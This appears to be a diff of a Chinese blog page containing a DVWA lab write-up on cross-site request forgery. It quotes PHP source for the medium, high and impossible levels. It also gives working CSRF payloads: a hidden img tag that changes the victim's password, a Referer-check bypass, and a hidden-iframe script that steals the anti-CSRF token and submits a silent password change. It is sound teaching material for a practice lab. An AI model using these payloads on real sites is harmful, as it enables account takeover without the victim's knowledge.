+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=<span class="string">"http://192.168.0.105/dvwa/vulnerabilities/csrf/?password_new=999&amp;password_conf=999&amp;Change=Change#"</span> border=<span class="string">"0"</span> style=<span class="string">"display:none;"</span>/&gt;</span><br><span class="line">&lt;h1&gt;<span class="number">404</span>&lt;h1&gt;</span><br><span class="line">&lt;h2&gt;file not found.&lt;h2&gt;</span><br></pre></td></tr></table></figure>
+<p>Ps：<code>style=&quot;display:none;&quot;</code>是为了不让这个<code>img</code>元素显示出来，让受害者不知不觉地受到攻击；192.168.0.105是我环境的地址</p>
+<p>写完之后访问一下</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DVWA/3-3.png" alt="3-3"></p>
+<p>再次回到登录平台尝试原本的密码，登录失败，密码换成999才成功</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DVWA/3-4.png" alt="3-4"></p>
+<h2 id="Security-Level-—-Medium"><a href="#Security-Level-—-Medium" class="headerlink" title="Security Level — Medium"></a>Security Level — Medium</h2><p>核心代码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_GET[ <span class="string">'Change'</span> ] ) ) &#123;</span><br><span class="line">	<span class="comment">// Checks to see where the request came from</span></span><br><span class="line">	<span class="keyword">if</span>( stripos( $_SERVER[ <span class="string">'HTTP_REFERER'</span> ] ,$_SERVER[ <span class="string">'SERVER_NAME'</span> ]) !== <span class="keyword">false</span> ) &#123;</span><br><span class="line">		<span class="comment">// Get input</span></span><br><span class="line">		$pass_new  = $_GET[ <span class="string">'password_new'</span> ];</span><br><span class="line">		$pass_conf = $_GET[ <span class="string">'password_conf'</span> ];</span><br><span class="line"></span><br><span class="line">		<span class="comment">// Do the passwords match?</span></span><br><span class="line">		<span class="keyword">if</span>( $pass_new == $pass_conf ) &#123;</span><br><span class="line">			<span class="comment">// They do!</span></span><br><span class="line">			$pass_new = ((<span class="keyword">isset</span>($GLOBALS[<span class="string">"___mysqli_ston"</span>]) &amp;&amp; is_object($GLOBALS[<span class="string">"___mysqli_ston"</span>])) ? mysqli_real_escape_string($GLOBALS[<span class="string">"___mysqli_ston"</span>],  $pass_new ) : ((trigger_error(<span class="string">"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work."</span>, E_USER_ERROR)) ? <span class="string">""</span> : <span class="string">""</span>));</span><br><span class="line">			$pass_new = md5( $pass_new );</span><br><span class="line"></span><br><span class="line">			<span class="comment">// Update the database</span></span><br><span class="line">			$insert = <span class="string">"UPDATE `users` SET password = '$pass_new' WHERE user = '"</span> . dvwaCurrentUser() . <span class="string">"';"</span>;</span><br><span class="line">			$result = mysqli_query($GLOBALS[<span class="string">"___mysqli_ston"</span>],  $insert ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">'&lt;pre&gt;'</span> . ((is_object($GLOBALS[<span class="string">"___mysqli_ston"</span>])) ? mysqli_error($GLOBALS[<span class="string">"___mysqli_ston"</span>]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : <span class="keyword">false</span>)) . <span class="string">'&lt;/pre&gt;'</span> );</span><br><span class="line"></span><br><span class="line">			<span class="comment">// Feedback for the user</span></span><br><span class="line">			$html .= <span class="string">"&lt;pre&gt;Password Changed.&lt;/pre&gt;"</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="comment">// Issue with passwords matching</span></span><br><span class="line">			$html .= <span class="string">"&lt;pre&gt;Passwords did not match.&lt;/pre&gt;"</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="comment">// Didn't come from a trusted source</span></span><br><span class="line">		$html .= <span class="string">"&lt;pre&gt;That request didn't look correct.&lt;/pre&gt;"</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	((is_null($___mysqli_res = mysqli_close($GLOBALS[<span class="string">"___mysqli_ston"</span>]))) ? <span class="keyword">false</span> : $___mysqli_res);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p><code>stripos()</code>函数：查找字符串首次出现的位置（不区分大小写）</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">stripos ( string $haystack , string $needle [, int $offset = 0 ] ) : int</span><br><span class="line"></span><br><span class="line">haystack：在该字符串中查找。</span><br><span class="line"></span><br><span class="line">needle：注意 needle 可以是一个单字符或者多字符的字符串。</span><br><span class="line">如果 needle 不是一个字符串，那么它将被转换为整型并被视为字符顺序值。</span><br><span class="line"></span><br><span class="line">offset：可选的 offset 参数，从字符此数量的开始位置进行搜索。 如果是负数，就从字符末尾此数量的字符数开始统计。</span><br></pre></td></tr></table></figure>
+<p>要更改密码必须通过<code>stripos()</code>函数限制的条件，也就是<code>$_SERVER[ &#39;HTTP_REFERER&#39; ]</code>字段里面必须有<code>$_SERVER[ &#39;SERVER_NAME&#39; ]</code>，现在根目录下写一个简单的php页面来测试一下SERVER_NAME字段到底是什么，页面代码：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">echo $_SERVER[ &apos;SERVER_NAME&apos; ];</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>我的环境是搭在虚拟机上，现在物理机访问一下这个页面可以看到返回的是<code>192.168.0.105</code>，正是我虚拟机的IP地址</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DVWA/3-5.png" alt="3-5"></p>
+<p>再用虚拟机访问一下本地，分别用<code>127.0.0.1</code>和<code>localhost</code></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DVWA/3-6.png" alt="3-6"></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DVWA/3-7.png" alt="3-7"></p>
+<p>现在明白这个道理之后，更改一下之前写的<code>file.html</code>的文件名为<code>192.168.0.105.html</code></p>
+<p>现在假设<code>攻击者（10.0.0.1）</code>将这个恶意的html代码放在自己的服务器的<code>attack目录</code>下，所以此时<code>被攻击者（192.168.0.105）</code>点击的链接就是<code>10.0.0.1/attack/192.168.0.105.html</code>，点击之后，<code>$_SERVER[ &#39;HTTP_REFERER&#39; ]=&quot;http://10.0.0.1/attack/192.168.0.105.html&quot;</code>，<code>$_SERVER[ &#39;SERVER_NAME&#39; ]=&quot;192.168.0.105&quot;</code>，满足条件，直接修改密码</p>
+<h2 id="Security-Level-—-High"><a href="#Security-Level-—-High" class="headerlink" title="Security Level — High"></a>Security Level — High</h2><p>核心代码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_GET[ <span class="string">'Change'</span> ] ) ) &#123;</span><br><span class="line">	<span class="comment">// Check Anti-CSRF token</span></span><br><span class="line">	checkToken( $_REQUEST[ <span class="string">'user_token'</span> ], $_SESSION[ <span class="string">'session_token'</span> ], <span class="string">'index.php'</span> );</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Get input</span></span><br><span class="line">	$pass_new  = $_GET[ <span class="string">'password_new'</span> ];</span><br><span class="line">	$pass_conf = $_GET[ <span class="string">'password_conf'</span> ];</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Do the passwords match?</span></span><br><span class="line">	<span class="keyword">if</span>( $pass_new == $pass_conf ) &#123;</span><br><span class="line">		<span class="comment">// They do!</span></span><br><span class="line">		$pass_new = ((<span class="keyword">isset</span>($GLOBALS[<span class="string">"___mysqli_ston"</span>]) &amp;&amp; is_object($GLOBALS[<span class="string">"___mysqli_ston"</span>])) ? mysqli_real_escape_string($GLOBALS[<span class="string">"___mysqli_ston"</span>],  $pass_new ) : ((trigger_error(<span class="string">"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work."</span>, E_USER_ERROR)) ? <span class="string">""</span> : <span class="string">""</span>));</span><br><span class="line">		$pass_new = md5( $pass_new );</span><br><span class="line"></span><br><span class="line">		<span class="comment">// Update the database</span></span><br><span class="line">		$insert = <span class="string">"UPDATE `users` SET password = '$pass_new' WHERE user = '"</span> . dvwaCurrentUser() . <span class="string">"';"</span>;</span><br><span class="line">		$result = mysqli_query($GLOBALS[<span class="string">"___mysqli_ston"</span>],  $insert ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">'&lt;pre&gt;'</span> . ((is_object($GLOBALS[<span class="string">"___mysqli_ston"</span>])) ? mysqli_error($GLOBALS[<span class="string">"___mysqli_ston"</span>]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : <span class="keyword">false</span>)) . <span class="string">'&lt;/pre&gt;'</span> );</span><br><span class="line"></span><br><span class="line">		<span class="comment">// Feedback for the user</span></span><br><span class="line">		$html .= <span class="string">"&lt;pre&gt;Password Changed.&lt;/pre&gt;"</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="comment">// Issue with passwords matching</span></span><br><span class="line">		$html .= <span class="string">"&lt;pre&gt;Passwords did not match.&lt;/pre&gt;"</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	((is_null($___mysqli_res = mysqli_close($GLOBALS[<span class="string">"___mysqli_ston"</span>]))) ? <span class="keyword">false</span> : $___mysqli_res);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Generate Anti-CSRF token</span></span><br><span class="line">generateSessionToken();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>可以看到代码中已经加入了<code>Anti-CSRF token</code>的验证，用户每次访问改密页面时，服务器会返回一个随机的token，向服务器发起请求时，需要提交token参数，而服务器在收到请求时，会优先检查token，只有token正确，才会处理客户端的请求</p>
+<p>想要修改密码就需要拥有正确的token，如果像之前那样想诱导被攻击者者点击链接行不通了，因为现在的浏览器不允许跨域的请求，攻击脚本在攻击者服务器上，所以单单靠此时的攻击脚本想要获取受害者的token是不行的，就是因为不能跨域请求，所以行得通的就是将攻击脚本放在受害者的服务器上，点击然后获取token并提交修改密码。将以下代码写入受害者服务器中，保存为HTML，受害者访问时，密码将会被无声无息地更改为888</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="undefined"> </span></span><br><span class="line"><span class="javascript">    <span class="function"><span class="keyword">function</span> <span class="title">attack</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">	<span class="built_in">document</span>.getElementsByName(<span class="string">'user_token'</span>)[<span class="number">0</span>].value=<span class="built_in">document</span>.getElementById(<span class="string">"hack"</span>).contentWindow.document.getElementsByName(<span class="string">'user_token'</span>)[<span class="number">0</span>].value;</span></span><br><span class="line"><span class="javascript">	<span class="built_in">document</span>.getElementById(<span class="string">"transfer"</span>).submit(); </span></span><br><span class="line"><span class="undefined">	&#125;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">"http://192.168.0.105/dvwa/vulnerabilities/csrf"</span> <span class="attr">id</span>=<span class="string">"hack"</span> <span class="attr">border</span>=<span class="string">"0"</span> <span class="attr">style</span>=<span class="string">"display:none;"</span>&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="tag">&lt;<span class="name">body</span> <span class="attr">onload</span>=<span class="string">"attack()"</span>&gt;</span></span><br><span class="line"> </span><br><span class="line">	<span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">"GET"</span> <span class="attr">id</span>=<span class="string">"transfer"</span> <span class="attr">action</span>=<span class="string">"http://192.168.0.105/dvwa/vulnerabilities/csrf"</span>&gt;</span></span><br><span class="line"> </span><br><span class="line">		<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"password_new"</span> <span class="attr">value</span>=<span class="string">"888"</span>&gt;</span></span><br><span class="line"> </span><br><span class="line">		<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"password_conf"</span> <span class="attr">value</span>=<span class="string">"888"</span>&gt;</span></span><br><span class="line"> </span><br><span class="line">		<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"user_token"</span> <span class="attr">value</span>=<span class="string">""</span>&gt;</span></span><br><span class="line"> </span><br><span class="line">		<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"Change"</span> <span class="attr">value</span>=<span class="string">"Change"</span>&gt;</span></span><br><span class="line"> </span><br><span class="line">	<span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>还有一种办法就是通过XSS获取token，然后就可以实现跨域的攻击</p>
+<h2 id="Security-Level-—-Impossible"><a href="#Security-Level-—-Impossible" class="headerlink" title="Security Level — Impossible"></a>Security Level — Impossible</h2><p>核心代码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_GET[ <span class="string">'Change'</span> ] ) ) &#123;</span><br><span class="line">	<span class="comment">// Check Anti-CSRF token</span></span><br><span class="line">	checkToken( $_REQUEST[ <span class="string">'user_token'</span> ], $_SESSION[ <span class="string">'session_token'</span> ], <span class="string">'index.php'</span> );</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Get input</span></span><br><span class="line">	$pass_curr = $_GET[ <span class="string">'password_current'</span> ];</span><br><span class="line">	$pass_new  = $_GET[ <span class="string">'password_new'</span> ];</span><br><span class="line">	$pass_conf = $_GET[ <span class="string">'password_conf'</span> ];</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Sanitise current password input</span></span><br><span class="line">	$pass_curr = stripslashes( $pass_curr );</span><br><span class="line">	$pass_curr = ((<span class="keyword">isset</span>($GLOBALS[<span class="string">"___mysqli_ston"</span>]) &amp;&amp; is_object($GLOBALS[<span class="string">"___mysqli_ston"</span>])) ? mysqli_real_escape_string($GLOBALS[<span class="string">"___mysqli_ston"</span>],  $pass_curr ) : ((trigger_error(<span class="string">"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work."</span>, E_USER_ERROR)) ? <span class="string">""</span> : <span class="string">""</span>));</span><br><span class="line">	$pass_curr = md5( $pass_curr );</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Check that the current password is correct</span></span><br><span class="line">	$data = $db-&gt;prepare( <span class="string">'SELECT password FROM users WHERE user = (:user) AND password = (:password) LIMIT 1;'</span> );</span><br><span class="line">	$data-&gt;bindParam( <span class="string">':user'</span>, dvwaCurrentUser(), PDO::PARAM_STR );</span><br><span class="line">	$data-&gt;bindParam( <span class="string">':password'</span>, $pass_curr, PDO::PARAM_STR );</span><br><span class="line">	$data-&gt;execute();</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Do both new passwords match and does the current password match the user?</span></span><br><span class="line">	<span class="keyword">if</span>( ( $pass_new == $pass_conf ) &amp;&amp; ( $data-&gt;rowCount() == <span class="number">1</span> ) ) &#123;</span><br><span class="line">		<span class="comment">// It does!</span></span><br><span class="line">		$pass_new = stripslashes( $pass_new );</span><br><span class="line">		$pass_new = ((<span class="keyword">isset</span>($GLOBALS[<span class="string">"___mysqli_ston"</span>]) &amp;&amp; is_object($GLOBALS[<span class="string">"___mysqli_ston"</span>])) ? mysqli_real_escape_string($GLOBALS[<span class="string">"___mysqli_ston"</span>],  $pass_new ) : ((trigger_error(<span class="string">"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work."</span>, E_USER_ERROR)) ? <span class="string">""</span> : <span class="string">""</span>));</span><br><span class="line">		$pass_new = md5( $pass_new );</span><br><span class="line"></span><br><span class="line">		<span class="comment">// Update database with new password</span></span><br><span class="line">		$data = $db-&gt;prepare( <span class="string">'UPDATE users SET password = (:password) WHERE user = (:user);'</span> );</span><br><span class="line">		$data-&gt;bindParam( <span class="string">':password'</span>, $pass_new, PDO::PARAM_STR );</span><br><span class="line">		$data-&gt;bindParam( <span class="string">':user'</span>, dvwaCurrentUser(), PDO::PARAM_STR );</span><br><span class="line">		$data-&gt;execute();</span><br><span class="line"></span><br><span class="line">		<span class="comment">// Feedback for the user</span></span><br><span class="line">		$html .= <span class="string">"&lt;pre&gt;Password Changed.&lt;/pre&gt;"</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="comment">// Issue with passwords matching</span></span><br><span class="line">		$html .= <span class="string">"&lt;pre&gt;Passwords did not match or current password incorrect.&lt;/pre&gt;"</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Generate Anti-CSRF token</span></span><br><span class="line">generateSessionToken();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>在impossible难度中，直接需要输入原始密码才能更改密码，并且添加利用PDO技术防御SQL注入，而CSRF方面，如果不知道原始密码就全部无法更改密码了</p>
+<hr>
+<p>参考文章：</p>
+<p><a href="https://www.freebuf.com/articles/web/118352.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/118352.html</a></p>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">DVWA</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/Knlvre.github-io/2019/02/12/DVWA 3-Cross Site Request Forgery（CSRF跨站脚本伪造）/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
   
     <nav id="page-nav">
-      <a class="extend prev" rel="prev" href="/Knlvre.github-io/page/3/">&laquo; Prev</a><a class="page-number" href="/Knlvre.github-io/">1</a><a class="page-number" href="/Knlvre.github-io/page/2/">2</a><a class="page-number" href="/Knlvre.github-io/page/3/">3</a><span class="page-number current">4</span><a class="page-number" href="/Knlvre.github-io/page/5/">5</a><a class="page-number" href="/Knlvre.github-io/page/6/">6</a><a class="extend next" rel="next" href="/Knlvre.github-io/page/5/">Next &raquo;</a>
+      <a class="extend prev" rel="prev" href="/Knlvre.github-io/page/3/">&laquo; Prev</a><a class="page-number" href="/Knlvre.github-io/">1</a><a class="page-number" href="/Knlvre.github-io/page/2/">2</a><a class="page-number" href="/Knlvre.github-io/page/3/">3</a><span class="page-number current">4</span><a class="page-number" href="/Knlvre.github-io/page/5/">5</a><a class="extend next" rel="next" href="/Knlvre.github-io/page/5/">Next &raquo;</a>
     </nav>
   
 
@@ -1695,11 +1598,11 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color1">CTF比赛</a>
+                <a href="javascript:void(0)" class="js-tag color5">渗透测试</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">渗透测试</a>
+                <a href="javascript:void(0)" class="js-tag color1">CTF比赛</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -1707,11 +1610,11 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color1">基础知识点</a>
+                <a href="javascript:void(0)" class="js-tag color5">Sqli-labs</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">Sqli-labs</a>
+                <a href="javascript:void(0)" class="js-tag color1">基础知识点</a>
               </li>
              
               <li class="article-tag-list-item">
